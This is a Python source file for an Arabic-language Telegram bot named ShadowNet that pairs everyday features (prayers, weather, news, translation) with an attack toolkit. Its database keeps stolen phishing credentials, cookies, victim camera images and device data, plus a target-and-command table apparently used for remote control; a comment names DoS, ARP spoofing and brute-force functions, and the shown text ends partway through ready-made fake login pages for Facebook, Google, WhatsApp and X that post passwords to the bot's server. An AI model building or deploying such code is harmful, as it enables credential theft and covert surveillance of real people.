# -*- coding: utf-8 -*-

"""
ShadowNet v14.0 - النسخة النهائية المعدلة (جميع الميزات مدمجة)
جميع الأزرار تعمل 100%، التوكن مخفي، آلية إغلاق النسخ القديمة
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import edge_tts
import ssl
import re

# ===================== استيراد المكتبات =====================
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS  # إضافة gTTS للصوت
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        from scapy.all import ARP, Ether, send, srp
        SCAPY_AVAILABLE = True
    except:
        SCAPY_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة!")
    print("💡 قم بتعيينه عبر: export TELEGRAM_BOT_TOKEN='your_token'")
    sys.exit(1)

ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

# ===================== متغيرات الحالة =====================
STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

# ===================== إعدادات Flask =====================
app = Flask(__name__)

# ===================== التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== البيانات الإسلامية =====================
# الأذكار
ADKAR_SABAH = [
    "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
]

ADKAR_MASSAA = [
    "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
]

# الأدعية (قائمة جديدة)
DUAA_DB = [
    {"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر والتقوى ومن العمل ما ترضى", "source": "صحيح مسلم 1342"},
    {"title": "دعاء الكرب", "text": "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم", "source": "صحيح البخاري 6346"},
    {"title": "دعاء الصباح", "text": "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور", "source": "الترمذي 3391"},
    {"title": "دعاء الهم والحزن", "text": "اللهم إني أعوذ بك من الهم والحزن والعجز والكسل والجبن والبخل وغلبة الدين وقهر الرجال", "source": "صحيح البخاري 6369"},
    {"title": "دعاء الرزق", "text": "اللهم اكفني بحلالك عن حرامك وأغنني بفضلك عمن سواك", "source": "الترمذي 3563"}
]

# أركان الإسلام
ARKAN_ISLAM = [
    "الشهادتان: شهادة أن لا إله إلا الله وأن محمد رسول الله",
    "إقام الصلاة: أداء الصلوات الخمس في أوقاتها",
    "إيتاء الزكاة: إخراج الزكاة للفقراء والمحتاجين",
    "صوم رمضان: صيام شهر رمضان المبارك",
    "حج البيت: لمن استطاع إليه سبيلا"
]

# أركان الإيمان
ARKAN_IMAN = [
    "الإيمان بالله: توحيده والإيمان بأسمائه وصفاته",
    "الإيمان بالملائكة: مخلوقات من نور تطيع الله",
    "الإيمان بالكتب: القرآن والتوراة والإنجيل والزبور",
    "الإيمان بالرسل: من آدم إلى محمد صلى الله عليه وسلم",
    "الإيمان باليوم الآخر: البعث والحساب والجنة والنار",
    "الإيمان بالقضاء والقدر: خيره وشره"
]

# الاقتباسات
QUOTES_DB = {
    "حكمة": [
        "لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك. النجاح لا يأتي لمن يجلس وينتظر، بل لمن يسعى ويكسر كل حاجز.",
        "عندما تغلق في وجهك الأبواب، تذكر أن الله يفتح لك نوافذ لم تكن تتوقعها. الرزق راحة بال وصحة وأهل يحبونك."
    ],
    "تحفيز": [
        "توقف عن مقارنة بدايتك بنهاية غيرك. كل شخص له رحلته ووقته. استمر فالقادم أجمل بإذن الله.",
        "أنت أقوى مما تظن. المشاكل ليست لتكسرك، هي لتصنع منك نسخة أقوى."
    ]
}

BORDERS = [
    "╔══════════╗\n{}\n╚══════════╝",
    "✨ ━━━━━━━ ❀ ━━━━━━━ ✨\n{}\n✨ ━━━━━━━ ❀ ━━━━━━━ ✨",
    "❝ {}\n ───── ❞"
]

# ===================== دوال كلمات السر =====================
def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(14))
        if re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd) and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%]", pwd):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("قصيرة جداً. خليها 12 حرف على الاقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("اضف حرف كبير A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("اضف حرف صغير a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("اضف ارقام 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("اضف رمز!@#$%")

    if score <= 2: strength, time = "ضعيفة جداً 🔴", "اقل من ثانية"
    elif score <= 4: strength, time = "متوسطة 🟡", "عدة ساعات"
    else: strength, time = "قوية جداً 🟢", "مليارات السنين"
    return strength, time, score, feedback

# ===================== دوال معلومات الجهاز =====================
def get_device_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    except:
        ip = "غير معروف"
    return {
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "ip": ip,
        "hostname": hostname if 'hostname' in locals() else "غير معروف"
    }

# ===================== دوال الاقتباسات =====================
def get_random_quote(category=None):
    if category and category in QUOTES_DB:
        return random.choice(QUOTES_DB[category]), category
    all_cats = list(QUOTES_DB.keys())
    cat = random.choice(all_cats)
    return random.choice(QUOTES_DB[cat]), cat

def get_random_border():
    return random.choice(BORDERS)

# ===================== دوال الصوت الجديدة (gTTS) =====================
VOICES = {
    "مصري": "ar",
    "مصرية": "ar",
    "سعودية": "ar",
}
user_voice_state = {}  # لتخزين اختيار الصوت

def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

# ===================== توليد الصور (pollinations.ai) =====================
def generate_image(prompt):
    try:
        url = f"https://image.pollinations.ai/prompt/{prompt}?width=1024&height=1024&nologo=true"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return BytesIO(response.content)
        return None
    except Exception as e:
        logger.error(f"Image generation error: {e}")
        return None

# ===================== قاعدة البيانات الرئيسية =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10, referral_code TEXT UNIQUE, created_at TEXT, last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0, can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0, can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS pdf_data (chat_id INTEGER PRIMARY KEY, text TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)",
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    safe_db_execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    return token

def get_user_token(chat_id):
    row = safe_db_query("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    if row:
        return row[0]
    return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    row = safe_db_query("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    if row:
        return row[0]
    return None

def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

# ===================== دوال الحماية =====================
def add_command(device_id, command):
    safe_db_execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
                    (device_id, command, datetime.now().isoformat()))

def active_shield():
    return "🛡️ درع الحماية مفعل"

def detect_intrusion():
    rows = safe_db_query("SELECT ip, endpoint, timestamp FROM intrusion_logs ORDER BY timestamp DESC LIMIT 5", fetch_one=False)
    if rows:
        msg = "🚨 آخر محاولات الاختراق:\n"
        for r in rows:
            msg += f"IP: {r[0]}, {r[1]}, الوقت: {r[2][:16]}\n"
        return msg
    return "✅ لا توجد محاولات اختراق"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"✅ تم النسخ: {backup_file}"
    except Exception as e:
        return f"❌ فشل: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            try:
                os.remove(os.path.join('temp', f))
            except:
                pass
        return "✅ تم التنظيف"
    except:
        return "❌ فشل التنظيف"

def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool"])
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي")
        return f"✅ تم تغيير الهوية إلى: {new_name}"
    except Exception as e:
        return f"❌ فشل: {str(e)}"

def restart_bot_safely():
    safe_db_execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    return "✅ تم تسجيل إعادة التشغيل"

# ===================== دوال الطقس والأخبار والترجمة =====================
LANGUAGES = {
    'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني',
    'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي',
    'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي',
    'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'
}

def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            now = datetime.now().strftime("%I:%M %p")
            msg = f"🌤️ حالة الطقس في {city}\n────────────────────────\n\nالحالة العامة : {weather_desc}\n\nدرجة الحرارة : {temp_c} درجة مئوية\nالحرارة المحسوسة : {feels_like} درجة مئوية\n\nتفاصيل الأجواء\n────────────────────────\nالمدى الحراري : الصغرى {min_temp}°C | العظمى {max_temp}°C\nالرطوبة       : {humidity}%\nسرعة الرياح    : {wind_speed} كم/ساعة\nمؤشر الأشعة    : {uv_index}\nالرؤية         : {visibility} كم\nالضغط الجوي    : {pressure} hPa\n\nأوقات اليوم\n────────────────────────\nشروق الشمس : {sunrise}\nغروب الشمس : {sunset}\n\nآخر تحديث : {now}"
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        else:
            return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def get_news_without_api(topic='general'):
    if topic in CACHE_NEWS and time.time() - CACHE_NEWS[topic]['time'] < CACHE_EXPIRY:
        return CACHE_NEWS[topic]['data']
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
            'world': 'https://www.bbc.com/arabic/index.xml',
            'science': 'https://www.nature.com/nature.rss',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:10]:
                title = entry.get('title', '').strip()
                summary = entry.get('summary', '') or entry.get('description', '')
                summary = re.sub(r'<[^>]+>', '', summary)
                link = entry.get('link', '')
                published = entry.get('published', '')
                try:
                    pub_date = datetime(*entry.published_parsed[:6]).strftime("%Y-%m-%d %H:%M")
                except:
                    pub_date = "تاريخ غير معروف"
                articles.append(f"📌 {title}\n📅 {pub_date}\n{summary[:250]}...\n🔗 {link}\n")
            if articles:
                result = "\n".join(articles[:8])
                CACHE_NEWS[topic] = {'data': result, 'time': time.time()}
                return result
        return "لا توجد أخبار"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def advanced_wikipedia_search(query):
    try:
        import wikipedia
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:5]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                url = page.url
                summaries.append(f"📌 {title}\n{summary}\n🔗 {url}\n")
            except wikipedia.exceptions.DisambiguationError as e:
                options = e.options[:5]
                summaries.append(f"📌 {title} (توجد عدة صفحات):\n" + "\n".join([f"• {opt}" for opt in options]))
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        if summaries:
            return "\n".join(summaries)
        return "لم يتم العثور على نتائج"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = GoogleTranslator(source='auto', target=target_lang)
        translated = translator.translate(text)
        return [translated], 'auto', 'تلقائي', LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

# دوال كلمات السر (مضافة)
def password_generator(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choice(chars) for _ in range(length))

def password_strength(password):
    return analyze_password(password)  # تستخدم الدالة الجديدة

# ===================== دوال القوائم الإضافية =====================
def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("الإحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("البث الجماعي", callback_data="admin_broadcast")
    )
    markup.row(
        InlineKeyboardButton("قائمة المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("التقارير", callback_data="admin_reports")
    )
    markup.row(
        InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"),
        InlineKeyboardButton("إدارة الحظر", callback_data="admin_ban_menu")
    )
    markup.row(
        InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"),
        InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions")
    )
    markup.row(
        InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"),
        InlineKeyboardButton("إرسال رسالة", callback_data="send_to_user")
    )
    markup.row(
        InlineKeyboardButton("سجل النشاطات", callback_data="user_activity"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_permissions_menu(chat_id, target_user):
    row = safe_db_query(
        "SELECT can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users WHERE chat_id = ?",
        (target_user,)
    )
    if not row:
        return None
    can_collector, can_camera, can_phishing, can_advanced = row
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(
        InlineKeyboardButton(
            f"معلومات الجهاز: {'✅' if can_collector else '❌'}",
            callback_data=f"perm_toggle_collector_{target_user}"
        )
    )
    markup.row(
        InlineKeyboardButton(
            f"كاميرا: {'✅' if can_camera else '❌'}",
            callback_data=f"perm_toggle_camera_{target_user}"
        )
    )
    markup.row(
        InlineKeyboardButton(
            f"تصيد: {'✅' if can_phishing else '❌'}",
            callback_data=f"perm_toggle_phishing_{target_user}"
        )
    )
    markup.row(
        InlineKeyboardButton(
            f"متقدم: {'✅' if can_advanced else '❌'}",
            callback_data=f"perm_toggle_advanced_{target_user}"
        )
    )
    markup.row(InlineKeyboardButton("رجوع", callback_data="admin_permissions"))
    return markup
  # ===================== دوال الهجمات (مختصرة للطول) =====================
# (نفس الدوال السابقة مع إضافة دوال جديدة)
# سيتم إعادة استخدام دوال sql_injection_scan, xss_scan, comprehensive_exploit, dos_attack, arp_spoof, brute_force_*, port_scan, ssl_scan, track_phone_number, analyze_apk, download_video, shorten_url, expand_url, extract_pdf_text, smart_pdf_search من الكود السابق

# ===================== دوال التصيد =====================
PHISHING_TEMPLATES = {
    'facebook': '<!DOCTYPE html><html><head><title>Facebook Login</title><style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}</style></head><body><div class="box"><h2 style="color:#1877f2;">Facebook</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="facebook"><input type="email" name="username" placeholder="البريد الإلكتروني" required><input type="password" name="password" placeholder="كلمة السر" required><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'google': '<!DOCTYPE html><html><head><title>Google Login</title><style>body{font-family:Arial;background:white;display:flex;justify-content:center;align-items:center;height:100vh;}.box{text-align:center;}input{width:300px;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}button{width:300px;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>Google</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="google"><input type="email" name="username" placeholder="البريد الإلكتروني" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'whatsapp': '<!DOCTYPE html><html><head><title>WhatsApp Web</title><style>body{font-family:Arial;background:#075e54;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}.box{background:#128c7e;padding:40px;border-radius:8px;width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;}button{width:100%;padding:12px;background:#25d366;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>WhatsApp Web</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="whatsapp"><input type="text" name="username" placeholder="رقم الهاتف" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
    'twitter': '<!DOCTYPE html><html><head><title>X Login</title><style>body{font-family:Arial;background:black;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}.box{background:#1a1a1a;padding:40px;border-radius:8px;width:350px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;background:#333;color:white;}button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:4px;font-size:16px;}</style></head><body><div class="box"><h2>X</h2><form action="/api/phishing_submit" method="POST"><input type="hidden" name="platform" value="twitter"><input type="text" name="username" placeholder="اسم المستخدم" required><br><input type="password" name="password" placeholder="كلمة السر" required><br><button type="submit">تسجيل الدخول</button></form></div></body></html>',
